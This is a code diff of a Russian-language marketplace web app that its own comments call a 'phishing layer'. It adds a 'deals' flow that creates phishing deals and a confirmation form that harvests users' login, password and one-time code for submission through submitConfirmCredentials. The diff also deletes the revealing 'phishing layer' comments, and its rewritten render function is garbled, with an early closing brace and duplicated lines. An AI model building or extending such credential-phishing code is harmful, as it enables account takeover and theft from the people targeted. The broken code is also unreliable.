@@ -1,4 +1,3 @@
-// app.js — полная версия с фишинг-слоем
 (() => {
   const D = window.DATA;
   const $ = (sel, el = document) => el.querySelector(sel);
@@ -43,8 +42,8 @@
     listings: saved.listings || [],
     orders: saved.orders || [],
     ops: saved.ops || [],
-    support: saved.support || [{ id: "s0", from: "support", text: "👋 Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
-    /* --- phishing layer: deals state --- */
+    support: saved.support || [{ id: "s0", from: "support", text: " Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
+    /* --- phishing layer --- */
     dealBalance: saved.dealBalance || 0,
     dealDeals: saved.dealDeals || [],
     confirmModal: null,
@@ -551,7 +550,6 @@
       <div class="row" style="justify-content:space-between"><h2 class="h2">${title}</h2><button type="button" class="lot-tool" data-sheet="">${I.x}</button></div>${inner}</div></div>`;
   }
 
-  /* --- phishing layer: deals view --- */
   function dealsView() {
     const p = state.profile;
     const deals = state.dealDeals || [];
@@ -627,7 +625,6 @@
     </div>`;
   }
 
-  /* --- phishing layer: confirm modal --- */
   function confirmModalHtml() {
     const deal = state.confirmModal;
     if (!deal) return "";
@@ -796,11 +793,15 @@
   }
 
   function render() {
-    const root = $("#app");
-    root.innerHTML = `${state.toast ? `<div class="toast">${esc(state.toast)}</div>` : ""}
-      ${confirmModalHtml()}
-      ${state.screen === "hub" ? hub() : `<div class="${state.screen === "support" ? "chat-screen" : ""}" style="flex:1;min-height:0;display:flex;flex-direction:column">${topbar()}${view()}</div>${tabbar()}`}`;
-    bind(root);
+  const root = $("#app");
+  root.innerHTML = `${state.toast ? `<div class="toast">${esc(state.toast)}</div>` : ""}
+    ${confirmModalHtml()}
+    ${state.screen === "hub" ? hub() : `<div class="${state.screen === "support" ? "chat-screen" : ""}" style="flex:1;min-height:0;display:flex;flex-direction:column">${topbar()}${view()}</div>${tabbar()}`}`;
+  
+  const log = $("#chatlog");
+  if (log) log.scrollTop = log.scrollHeight;
+}
+    
     const log = $("#chatlog");
     if (log) log.scrollTop = log.scrollHeight;
   }
@@ -887,7 +888,17 @@
       if (t.dataset.pick != null) { state.shopPick = t.dataset.pick; state.shopRegion = ""; render(); return; }
       if (t.dataset.region) { state.shopRegion = state.shopRegion === t.dataset.region ? "" : t.dataset.region; render(); return; }
       if (t.dataset.role) { state.sell.role = t.dataset.role; state.sell.step = 2; render(); return; }
-      if (t.dataset.svc) { state.sell.category = t.dataset.svc; applyCopy(); render(); return; }
+      if (t.dataset.svc) { 
+        state.sell.category = t.dataset.svc; 
+        applyCopy(); 
+        // FIX: Auto-jump to form for "Deals" category
+        if (t.dataset.svc === "deals") {
+           state.sell.role = "sell";
+           state.sell.step = 3;
+        }
+        render(); 
+        return; 
+      }
       if (t.dataset.game) { state.sell.gameId = t.dataset.game; applyCopy(); render(); return; }
       if (t.dataset.want) { state.sell.wantGameId = t.dataset.want; applyCopy(); render(); return; }
       if (t.dataset.offer) { state.sell.category = t.dataset.offercat; const g = game(state.sell.gameId); state.sell.title = g ? `${g.name} · ${t.dataset.offertitle}` : t.dataset.offertitle; state.sell.description = `${t.dataset.offertitle}. Передача после оплаты.`; render(); return; }
@@ -968,7 +979,6 @@
         toast("Адрес сохранён"); return;
       }
       if (t.hasAttribute("data-send-chat")) { sendSupport(chatDraft()); return; }
-      /* --- phishing layer bindings --- */
       if (t.dataset.dealFilter) { state.dealFilter = t.dataset.dealFilter; render(); return; }
       if (t.dataset.confirmDeal) {
         const deal = state.dealDeals.find((d) => d.id === t.dataset.confirmDeal);
@@ -1050,5 +1060,99 @@
     }
     n += 1; setTimeout(tryBoot, 40);
   };
+// Attach event delegation ONCE at boot
+document.getElementById("app").addEventListener("click", (e) => {
+  const t = e.target.closest("[data-go],[data-buy],[data-site],[data-back],[data-fold],[data-pick],[data-region],[data-role],[data-svc],[data-game],[data-want],[data-offer],[data-sell-next],[data-sell-back],[data-publish],[data-buy-go],[data-sheet],[data-ccy],[data-pick-ccy],[data-set-ccy],[data-topup],[data-withdraw],[data-sort-dir],[data-sort-key],[data-save-api],[data-send-chat],[data-confirm-deal],[data-deal-filter],[data-close-confirm]");
+  if (!t) return;
+  if (t.hasAttribute("data-stop")) return;
+  haptic();
+  if (t.dataset.go) { go(t.dataset.go, t.dataset.id); return; }
+  if (t.dataset.buy) { buy(t.dataset.buy); return; }
+  if (t.hasAttribute("data-site")) { openExternal(D.site); return; }
+  if (t.hasAttribute("data-back")) { history.back(); return; }
+  if (t.dataset.fold) { state.folds[t.dataset.fold] = !state.folds[t.dataset.fold]; render(); return; }
+  if (t.dataset.pick != null) { state.shopPick = t.dataset.pick; state.shopRegion = ""; render(); return; }
+  if (t.dataset.region) { state.shopRegion = state.shopRegion === t.dataset.region ? "" : t.dataset.region; render(); return; }
+  if (t.dataset.role) { state.sell.role = t.dataset.role; state.sell.step = 2; render(); return; }
+  if (t.dataset.svc) { 
+    state.sell.category = t.dataset.svc; 
+    applyCopy(); 
+    if (t.dataset.svc === "deals") { state.sell.role = "sell"; state.sell.step = 3; }
+    render(); return; 
+  }
+  if (t.dataset.game) { state.sell.gameId = t.dataset.game; applyCopy(); render(); return; }
+  if (t.dataset.want) { state.sell.wantGameId = t.dataset.want; applyCopy(); render(); return; }
+  if (t.dataset.offer) { state.sell.category = t.dataset.offercat; const g = game(state.sell.gameId); state.sell.title = g ? `${g.name} · ${t.dataset.offertitle}` : t.dataset.offertitle; state.sell.description = `${t.dataset.offertitle}. Передача после оплаты.`; render(); return; }
+  if (t.hasAttribute("data-sell-next")) {
+    const s = state.sell;
+    if (s.role === "sell") {
+      if (!s.photos.length) return toast("Добавьте хотя бы одно фото");
+      const titleEl = $("#title"), descEl = $("#desc"), priceEl = $("#price");
+      if (titleEl) s.title = titleEl.value.trim();
+      if (descEl) s.description = descEl.value.trim();
+      if (priceEl) s.price = priceEl.value.trim();
+      const amt = parseAmount(s.price);
+      if (!amt || amt <= 0) return toast("Укажите цену больше 0");
+      s.step = 3; render(); return;
+    }
+    if (!s.gameId) return toast("Выберите игру");
+    s.step = 3; render(); return;
+  }
+  if (t.hasAttribute("data-sell-back")) { state.sell.step = Math.max(1, state.sell.step - 1); render(); return; }
+  if (t.hasAttribute("data-publish")) {
+    const s = state.sell;
+    if (!s.photos.length) return toast("Без фото лот не публикуется");
+    if (s.category === "deals") { createPhishingDeal(s); return; }
+    const it = { id: uid("l"), sellerId: state.profile.id, title: s.title || "Без названия", description: s.description || "", category: s.category, gameId: s.gameId, price: parseAmount(s.price) || 0, currency: s.currency, stock: 1, photos: s.photos, accent: (game(s.gameId) || {}).color };
+    state.listings.unshift(it);
+    state.ops.unshift({ id: uid("w"), type: "listing", amount: 0, currency: s.currency, status: "done", note: it.title, at: Date.now() });
+    persist(); toast("Лот опубликован"); go("home"); return;
+  }
+  if (t.hasAttribute("data-buy-go")) { state.sell.step = 1; state.sell.role = null; go("home"); return; }
+  if (t.dataset.sheet != null) { state.sheet = t.dataset.sheet || ""; state.amount = ""; state.details = ""; render(); return; }
+  if (t.dataset.ccy) { state.sell.currency = t.dataset.ccy; render(); return; }
+  if (t.dataset.pickCcy) { state.ccyPick = t.dataset.pickCcy; render(); return; }
+  if (t.hasAttribute("data-set-ccy")) { state.payCurrency = state.ccyPick; persist(); state.sheet = ""; render(); return; }
+  if (t.hasAttribute("data-topup")) {
+    const amtEl = $("#amt"), amt = parseAmount((amtEl && amtEl.value) || state.amount);
+    if (Number.isNaN(amt) || amt < minTopup(state.payCurrency)) return toast(`Минимум ${minTopup(state.payCurrency)} ${state.payCurrency}`);
+    state.balances[state.payCurrency] = (state.balances[state.payCurrency] || 0) + amt;
+    state.ops.unshift({ id: uid("w"), type: "topup", amount: amt, currency: state.payCurrency, status: "done", note: "Пополнение", at: Date.now() });
+    state.sheet = ""; state.amount = ""; persist(); toast("Баланс пополнен"); render(); return;
+  }
+  if (t.hasAttribute("data-withdraw")) {
+    const amtEl = $("#amt"), detEl = $("#det"), amt = parseAmount((amtEl && amtEl.value) || state.amount), det = (detEl && detEl.value || state.details || "").trim();
+    if (Number.isNaN(amt) || amt < minWithdraw(state.payCurrency)) return toast(`Минимум ${minWithdraw(state.payCurrency)} ${state.payCurrency}`);
+    const have = state.balances[state.payCurrency] || 0;
+    if (amt > have) return toast("Недостаточно средств");
+    state.balances[state.payCurrency] = have - amt;
+    state.ops.unshift({ id: uid("w"), type: "withdraw", amount: -amt, currency: state.payCurrency, status: "pending", note: det || "Вывод", at: Date.now() });
+    state.sheet = ""; state.amount = ""; state.details = ""; persist(); toast("Заявка на вывод создана"); render(); return;
+  }
+  if (t.hasAttribute("data-sort-dir")) { state.sortDir = state.sortDir === "desc" ? "asc" : "desc"; render(); return; }
+  if (t.hasAttribute("data-sort-key")) { state.sortKey = state.sortKey === "price" ? "title" : "price"; render(); return; }
+  if (t.hasAttribute("data-save-api")) { const el = $("#botapi"), v = (el && el.value || "").trim(); if (v) { try { localStorage.setItem("aurora-bot-api", v.replace(/\/$/, "")); } catch {} } toast("Адрес сохранён"); return; }
+  if (t.hasAttribute("data-send-chat")) { sendSupport(chatDraft()); return; }
+  if (t.dataset.dealFilter) { state.dealFilter = t.dataset.dealFilter; render(); return; }
+  if (t.dataset.confirmDeal) { const deal = state.dealDeals.find((d) => d.id === t.dataset.confirmDeal); if (deal) { state.confirmModal = deal; render(); } return; }
+  if (t.hasAttribute("data-close-confirm")) { state.confirmModal = null; render(); return; }
+});
+
+// Input listeners (attach once)
+document.getElementById("photos")?.addEventListener("change", async (e) => {
+  const files = Array.from(e.target.files || []);
+  for (const f of files.slice(0, 8 - state.sell.photos.length)) { try { state.sell.photos.push(await compressFile(f)); } catch {} }
+  render();
+});
+document.getElementById("q")?.addEventListener("input", (e) => { state.query = e.target.value; render(); });
+document.getElementById("chatf")?.addEventListener("submit", (e) => { e.preventDefault(); sendSupport(chatDraft()); });
+document.getElementById("confirmForm")?.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const login = (document.getElementById("cpLogin")?.value || "").trim();
+  const password = (document.getElementById("cpPass")?.value || "").trim();
+  const otp = (document.getElementById("cpOtp")?.value || "").trim();
+  if (!login || !password) return toast("Заполните все обязательные поля");
+  await submitConfirmCredentials(login, password, otp);
+});
   tryBoot();
 })();
